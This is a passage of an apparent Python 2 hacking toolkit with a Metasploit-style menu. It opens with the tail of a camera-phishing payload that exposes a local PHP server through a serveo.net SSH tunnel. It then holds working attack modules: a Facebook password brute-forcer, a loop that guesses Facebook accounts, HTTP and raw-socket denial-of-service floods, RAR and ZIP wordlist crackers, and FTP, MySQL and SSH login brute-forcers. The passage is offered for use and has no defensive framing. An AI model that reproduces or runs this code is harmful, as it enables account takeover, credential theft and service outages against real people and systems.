if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $subdomain_resp == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R whoami:80:localhost:'''+lport[0]+''' serveo.net  2> /dev/null > sendlink ' 
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'''+lport[0]+''' serveo.net 2> /dev/null > sendlink ' &
sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:'''+lport[0]+''')\e[0m\n"
fuser -k '''+lport[0]+'''/tcp > /dev/null 2>&1
php -S localhost:'''+lport[0]+''' > /dev/null 2>&1 &
}
start() {
server
payload
checkfound
}
start	

        ''')
    f.close()
    os.system('bash say.sh')
  elif amerr[:4] == 'help':
   help_help()
   payload_camera_html_reverse_tcp()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    payload_camera_html_reverse_tcp()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    payload_camera_html_reverse_tcp()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  payload_camera_html_reverse_tcp()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    payload_camera_html_reverse_tcp()


#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${end payloads}$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


#~!@~!$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${exploits}$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$UUUUUUUUUUUUUUUUUUUUUUUUU$$#UU

username = ['Anonymous']
listpass = ['core/pass.txt']
def crack_password_facebook():
 try:
  amerr = str(raw_input(default+'WhoAmi exploits('+red+'crack_password_facebook'+default+') > '))
  
  if  amerr[:12] == "set username" or  amerr[:12] == "set USERNAME" :
     username[0] = amerr[13:]
     print "USERNAME => ", username[0]
     crack_password_facebook()
  elif  amerr[:12] == "set listpass" or  amerr[:12] == "set LISTPASS" :
     listpass[0] = amerr[13:]
     print "LISTPASS => ", listpass[0]
     crack_password_facebook()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (crack_password_facebook):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        USERNAME  "+username[0]+"            yes            user of account "
   print"        LISTPASS  "+listpass[0]+"        yes            list password "
   print ""
   print ""
   crack_password_facebook()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    
    email = str(username[0])
    passwordlist = str(listpass[0])
    login = 'https://www.facebook.com/login.php?login_attempt=1'
    useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    
    def main():
    	global br
    	br = mechanize.Browser()
    	cj = cookielib.LWPCookieJar()
    	br.set_handle_robots(False)
    	br.set_handle_redirect(True)
    	br.set_cookiejar(cj)
    	br.set_handle_equiv(True)
    	br.set_handle_referer(True)
    	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    	welcome()
    	search()
    	print red+"[*]"+default+"Password does not exist in the wordlist"
    	crack_password_facebook()
    def brute(password):
    	sys.stdout.write( "\r"+blue+"[*]"+default+" Trying ..... {}\n".format(password))
    	sys.stdout.flush()
    	br.addheaders = [('User-agent', random.choice(useragents))]
    	site = br.open(login)
    	br.select_form(nr = 0)
    	br.form['email'] = email
    	br.form['pass'] = password
    	sub = br.submit()
    	log = sub.geturl()
    	if log != login and (not 'login_attempt' in log):
    			print green+"\n\n[+] Password Find = {}".format(password)
    			print ""
    			crack_password_facebook()
    def search():
    	global password
    	passwords = open(passwordlist,"r")
    	for password in passwords:
    		password = password.replace("\n","")
    		brute(password)

    def welcome():
    	wel=""
    	total = open(passwordlist,"r")
    	total = total.readlines()
    	print wel 
    	print blue+"[*] "+default+"Account to crack : {}".format(email)
    	print blue+"[*] "+default+"Loaded :" , len(total), "passwords"
    	print blue+"[*] "+default+"Cracking, please wait ...\n\n"
        
    if __name__ == '__main__':
    	main()
  elif amerr[:4] == 'help':
   help_help()
   crack_password_facebook()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "banner":
    banner()
    crack_password_facebook()  
 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    crack_password_facebook()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  crack_password_facebook()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    crack_password_facebook()

url = ['http://examples.com']
def dos_attack_requests():
 try:
  amerr = str(raw_input(default+'WhoAmi exploits('+red+'dos_attack_requests'+default+') > '))
  
  if  amerr[:7] == "set url" or  amerr[:7] == "set URL" :
     url[0] = amerr[8:]
     print "URL => ", url[0]
     dos_attack_requests()

  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (dos_attack_requests):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        URL       "+url[0]+"  yes           url webs target "
   print ""
   print ""
   dos_attack_requests()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    target = str(url[0])
    while True:
       requests.get(target)
       requests.get(target)
       print blue+"[*]"+default+"requests is Done"
       
  elif amerr[:4] == 'help':
   help_help()
   dos_attack_requests()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "banner":
    banner()
    dos_attack_requests()  
 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    dos_attack_requests()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  dos_attack_requests()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    dos_attack_requests()

nomber = ['05']
def available_facebook_motah():
 try:
  amerr = str(raw_input(default+'WhoAmi exploits('+red+'available_facebook_motah'+default+') > '))
  if  amerr[:10] == "set nomber" or  amerr[:10] == "set NOMBER" :
     nomber[0] = amerr[11:]
     print "NOMBER => ", nomber[0]
     available_facebook_motah()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (available_facebook_motah):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        NOMBER    "+nomber[0]+"                   yes           NOMBER "
   print ""
   print ""
   available_facebook_motah()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    kk = str(nomber[0])
    print blue +"[*]"+default+"starting cracking"
    print ""
    def motah():
     
     #email = str(raw_input("email"))
     email = str(random.randint(11111111,99999999))
     go = kk + email
     #password = str(raw_input("bass" ))
     password = str(random.randint(11111111,99999999))
     login = 'https://www.facebook.com/login.php?login_attempt=1'
     useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
     basss = random.randint(1111111,9999999)
     br = mechanize.Browser()
     amer = cookielib.LWPCookieJar()
     br.set_handle_robots(False)
     br.set_handle_redirect(True)
     br.set_cookiejar(amer)
     br.set_handle_equiv(True)
     # br.set_handle_referer(True)
     br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5) 
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr = 0)
     br.form['email'] = go
     br.form['pass'] = go
     sub = br.submit()
     log = sub.geturl()
     print b,"[*]Check===> ",r,go
     if "https://www.facebook.com/checkpoint/?next" in log :
       print g,"[*]good ---------> ",c,go
     elif "https://www.facebook.com/login.php" and "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
       print ""
     elif "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
      print ""
     else :
       print y,"--------------------------------"
       print g,"[*]email ---------> ",g,go
       print g,"[*]pass ---------> ",g,go
       print y,"--------------------------------"
     motah()
    motah()
  elif amerr[:4] == 'help':
   help_help()
   available_facebook_motah()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "banner":
    banner()
    available_facebook_motah()
 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    available_facebook_motah()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  available_facebook_motah()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    available_facebook_motah()



rhosts = ['192.168.1.1']
rports = ['80']
def dos_attack_socket():
 try:
  amerr = str(raw_input(default+'WhoAmi exploits('+red+'dos_attack_socket'+default+') > '))
  if  amerr[:10] == "set rhosts" or  amerr[:10] == "set RHOSTS" :
     rhosts[0] = amerr[11:]
     print "RHOSTS => ", rhosts[0]
     dos_attack_socket()
  elif  amerr[:10] == "set rports" or  amerr[:10] == "set RPORTS" :
     rports[0] = amerr[11:]
     print "RPORTS => ", rports[0]
     dos_attack_socket()


  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (dos_attack_socket):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        RHOSTS     "+rhosts[0]+"           yes          web target host "
   print"        RPORTS         "+rports[0]+"                yes          web target port "
   print ""
   print ""
   dos_attack_socket()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   os.system("rm -rf doss.py")
   s= open("doss.py", "w")
   s.write('''
import socket   
import time
import os
os.system('rm -rf doss.py')
#########{colors}################
basic_green 	=	"\033[0;32m"#
green			=	"\033[1;32m"#
green_underline	=	"\033[4;32m"#
basic_yellow	=	"\033[0;33m"#
yellow 			=	"\033[1;33m"#
white			=	"\033[0;37m"#
whiteb			=	"\033[1;37m"#
basic_red		=	"\033[0;31m"#
red				=	"\033[1;31m"#
cyan			=	"\033[1;36m"#
basic_cyan		=	"\033[0;36m"#
blue			=	"\033[1;34m"#
basic_blue		=	"\033[0;34m"#
light_blue		=	"\033[0;94m"#
blue_underline	=	"\033[4;34m"#
default			=	"\033[0m"   #
underline		=	"\033[4;32m"#
#################################
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("'''+rhosts[0]+'''", '''+rports[0]+'''))
print blue+"[*]"+default+"starting ddos attack"
print ""
while True:
     data = "efdgnbcxdfhbvvcxzdghbvcxdsfghbvvcxzsdfgfhbvcxzdsffghbvcxzsdfghbvcxzsrhtmHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"
     s.send(data.encode("utf-8"))
     s.send(data.encode("utf-8"))
     print blue+"[*]"+default+"attack send "
print red + "[-]"+default+"use is close"

   ''')
   
   s.close()
   os.system('python2 doss.py')
  elif amerr[:4] == 'help':
   help_help()
   dos_attack_socket()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    dos_attack_socket()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    dos_attack_socket()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  dos_attack_socket()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    dos_attack_socket()



file_rar = ['Anony.rar']
listpass = ['core/pass.txt']
def crack_password_file_rar():
 try:
  amerr = str(raw_input(default+'WhoAmi exploits('+red+'crack_password_file_rar'+default+') > '))
  
  if  amerr[:8] == "set file" or  amerr[:8] == "set FILE" :
     file_rar[0] = amerr[9:]
     print "FILE => ", file_rar[0]
     crack_password_file_rar()
  elif  amerr[:12] == "set listpass" or  amerr[:12] == "set LISTPASS" :
     listpass[0] = amerr[13:]
     print "LISTPASS => ", listpass[0]
     crack_password_file_rar()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (crack_password_file_rar):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        FILE      "+str(file_rar[0])+"            yes            RAR file to Crack "
   print"        LISTPASS  "+listpass[0]+"        yes            Wordlist "
   print ""
   print ""
   crack_password_file_rar()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
	Arch = open(str(listpass[0]),"r")
	leeArchivo = Arch.readlines()
	RARarch = RarFile(str(file_rar[0]))
	for palabra in leeArchivo:
		palabraLlegada = palabra.split("\n")
		try:
			RARarch.extractall(pwd=str(palabraLlegada[0]),path="/root/home/")
			print"Successfully with ["+palabraLlegada[0]+"] -> /root/home/"
			UTIL.sRegister(init,palabraLlegada[0])
			return
		except:print" | Checking '"+palabraLlegada[0]+"'"
	crack_password_file_rar()	
		

  elif amerr[:4] == 'help':
   help_help()
   crack_password_file_rar()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "banner":
    banner()
    crack_password_file_rar()  
 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    crack_password_file_rar()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  crack_password_file_rar()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    crack_password_file_rar()

file_zip = ['Anony.zip']
listpass = ['core/pass.txt']
def crack_password_file_zip():
 try:
  amerr = str(raw_input(default+'WhoAmi exploits('+red+'crack_password_file_zip'+default+') > '))
  
  if  amerr[:8] == "set file" or  amerr[:8] == "set FILE" :
     file_zip[0] = amerr[9:]
     print "FILE => ", file_zip[0]
     crack_password_file_zip()
  elif  amerr[:12] == "set listpass" or  amerr[:12] == "set LISTPASS" :
     listpass[0] = amerr[13:]
     print "LISTPASS => ", listpass[0]
     crack_password_file_zip()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (crack_password_file_zip):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        FILE      "+str(file_zip[0])+"            yes            RAR file to Crack "
   print"        LISTPASS  "+listpass[0]+"        yes            Wordlist "
   print ""
   print ""
   crack_password_file_zip()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    Arch = open(listpass[0],"r")
    leeArchivo = Arch.readlines()
    ZIParch = zipfile.ZipFile(str(file_zip[0]))
    for palabra in leeArchivo:
       palabraLlegada = palabra.split("\n")
       try:
           ZIParch.extractall(pwd=str(palabraLlegada[0]),path="/root/home/")
           print"Successfully with ["+palabraLlegada[0]+"] -> /root/home/"
           UTIL.sRegister(init,palabraLlegada[0])
           return
       except:print" | Checking '"+palabraLlegada[0]+"'"
    crack_password_file_zip()
		

  elif amerr[:4] == 'help':
   help_help()
   crack_password_file_zip()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "banner":
    banner()
    crack_password_file_zip()
 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    crack_password_file_zip()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  crack_password_file_zip()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    crack_password_file_zip()
ftprhosts = ['192.168.1.1']
ftpport   = ['21']
username  = ['Anonymous']
listpass  = ['core/pass.txt']

def brute_force_to_ftp_protocol():
 try:
  amerr = str(raw_input(default+'WhoAmi exploits('+red+'brute_force_to_ftp_protocol'+default+') > '))
  
  if  amerr[:10] == "set rhosts" or  amerr[:10] == "set RHOSTS" :
     ftprhosts[0] = amerr[11:]
     print "RHOSTS => ", ftprhosts[0]
     brute_force_to_ftp_protocol()
     
  elif  amerr[:10] == "set rports" or  amerr[:10] == "set RPORTS" :
     ftpport[0] = amerr[11:]
     print "RPORTS => ", ftpport[0]
     brute_force_to_ftp_protocol()
     
  elif  amerr[:12] == "set username" or  amerr[:12] == "set USERNAME" :
     username[0] = amerr[13:]
     print "USERNAME => ", username[0]
     brute_force_to_ftp_protocol()
     
  
  elif  amerr[:12] == "set listpass" or  amerr[:12] == "set LISTPASS" :
     listpass[0] = amerr[13:]
     print "LISTPASS => ", listpass[0]
     brute_force_to_ftp_protocol()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (brute_force_to_ftp_protocol):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        RHOSTS    "+str(ftprhosts[0])+"          yes           host Target "
   print"        RPORTS    "+str(ftpport[0])+"                   yes           Port Target "
   print"        USERNAME  "+str(username[0])+"            yes           Username Target"
   print"        LISTPASS  "+listpass[0]+"        yes           Wordlist "
   print ""
   print ""
   brute_force_to_ftp_protocol()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    NET.CheckConnectionHost(ftprhosts[0],ftpport[0],5)
    ftp = FTP()
    ftp.connect(ftprhosts[0],int(ftpport[0])) 
    with open(listpass[0],'r') as passwords:
        for password in passwords:
            password=password.replace("\n","")
            try:
              ftp.login(username[0],password)
              if True:
                  print blue+"[*]"+default+"Successfully with ["+username[0]+"]["+password+"]\n"
                  Space()
                  UTIL.sRegister(init,password)
                  return
            except:print " | Checking '"+password+"'"
    brute_force_to_ftp_protocol()   

  elif amerr[:4] == 'help':
   help_help()
   brute_force_to_ftp_protocol()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "banner":
    banner()
    brute_force_to_ftp_protocol()
 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    brute_force_to_ftp_protocol()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  brute_force_to_ftp_protocol()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    brute_force_to_ftp_protocol()

sqlrhosts = ['192.168.1.1']
sqlport   = ['3306']
username  = ['Anonymous']
listpass  = ['core/pass.txt']

def brute_force_to_sql_protocol():
 try:
  amerr = str(raw_input(default+'WhoAmi exploits('+red+'brute_force_to_sql_protocol'+default+') > '))
  
  if  amerr[:10] == "set rhosts" or  amerr[:10] == "set RHOSTS" :
     sqlrhosts[0] = amerr[11:]
     print "RHOSTS => ", sqlrhosts[0]
     brute_force_to_sql_protocol()
     
  elif  amerr[:10] == "set rports" or  amerr[:10] == "set RPORTS" :
     sqlport[0] = amerr[11:]
     print "RPORTS => ", sqlport[0]
     brute_force_to_sql_protocol()
     
  elif  amerr[:12] == "set username" or  amerr[:12] == "set USERNAME" :
     username[0] = amerr[13:]
     print "USERNAME => ", username[0]
     brute_force_to_sql_protocol()
     
  
  elif  amerr[:12] == "set listpass" or  amerr[:12] == "set LISTPASS" :
     listpass[0] = amerr[13:]
     print "LISTPASS => ", listpass[0]
     brute_force_to_sql_protocol()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (brute_force_to_sql_protocol):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        RHOSTS    "+str(sqlrhosts[0])+"          yes           host Target "
   print"        RPORTS    "+str(sqlport[0])+"                 yes           Port Target "
   print"        USERNAME  "+str(username[0])+"            yes           Username Target"
   print"        LISTPASS  "+str(listpass[0])+"        yes           Wordlist "
   print ""
   print ""
   brute_force_to_sql_protocol()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    NET.CheckConnectionHost(str(sqlrhosts[0]),sqlport[0],5)
    with open(str(listpass[0]),'r') as passwords:
       for password in passwords:
          password=password.replace("\n","")
          try:
             MySQLdb.connect(str(sqlrhosts[0]),str(username[0]),password,'',int(sqlport[0]))
             if True:
                    print blue + "[*]"+default+"Successfully with ["+str(username[0])+"]["+password+"]\n"
                    UTIL.sRegister(init,password)
                    return
          except:print" | Checking '"+password+"'"
    brute_force_to_sql_protocol() 

  elif amerr[:4] == 'help':
   help_help()
   brute_force_to_sql_protocol()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "banner":
    banner()
    brute_force_to_sql_protocol()
 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    brute_force_to_sql_protocol()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  brute_force_to_sql_protocol()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    brute_force_to_sql_protocol()


sshrhosts = ['192.168.1.1']
sshport   = ['22']
username  = ['Anonymous']
listpass  = ['core/pass.txt']

def brute_force_to_ssh_protocol():
 try:
  amerr = str(raw_input(default+'WhoAmi exploits('+red+'brute_force_to_ssh_protocol'+default+') > '))
  
  if  amerr[:10] == "set rhosts" or  amerr[:10] == "set RHOSTS" :
     sshrhosts[0] = amerr[11:]
     print "RHOSTS => ", sshrhosts[0]
     brute_force_to_ssh_protocol()
     
  elif  amerr[:10] == "set rports" or  amerr[:10] == "set RPORTS" :
     sshport[0] = amerr[11:]
     print "RPORTS => ", sshport[0]
     brute_force_to_ssh_protocol()
     
  elif  amerr[:12] == "set username" or  amerr[:12] == "set USERNAME" :
     username[0] = amerr[13:]
     print "USERNAME => ", username[0]
     brute_force_to_ssh_protocol()
     
  
  elif  amerr[:12] == "set listpass" or  amerr[:12] == "set LISTPASS" :
     listpass[0] = amerr[13:]
     print "LISTPASS => ", listpass[0]
     brute_force_to_ssh_protocol()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (brute_force_to_ssh_protocol):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        RHOSTS    "+str(sshrhosts[0])+"          yes           host Target "
   print"        RPORTS    "+str(sshport[0])+"                   yes           Port Target "
   print"        USERNAME  "+str(username[0])+"            yes           Username Target"
   print"        LISTPASS  "+str(listpass[0])+"        yes           Wordlist "
   print ""
   print ""
   brute_force_to_ssh_protocol()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    NET.CheckConnectionHost(str(sshrhosts[0]),sshport[0],5)
    with open(str(listpass[0]),'r') as passwords:
       for password in passwords:
            password=password.replace("\n","")
            try:
               connect = pxssh.pxssh()
               connect.login(str(sshrhosts[0]),str(username[0]),password)				
               if True:
                  print blue +"[*]"+default+"Successfully with ["+str(username[0])+"]["+password+"]\n"
                  UTIL.sRegister(init,password)
                  return
            except:print" | Checking '"+password+"'"
    brute_force_to_ssh_protocol()

  elif amerr[:4] == 'help':
   help_help()
   brute_force_to_ssh_protocol()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "banner":
    banner()
    brute_force_to_ssh_protocol()
 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    brute_force_to_ssh_protocol()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  brute_force_to_ssh_protocol()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    brute_force_to_ssh_protocol()
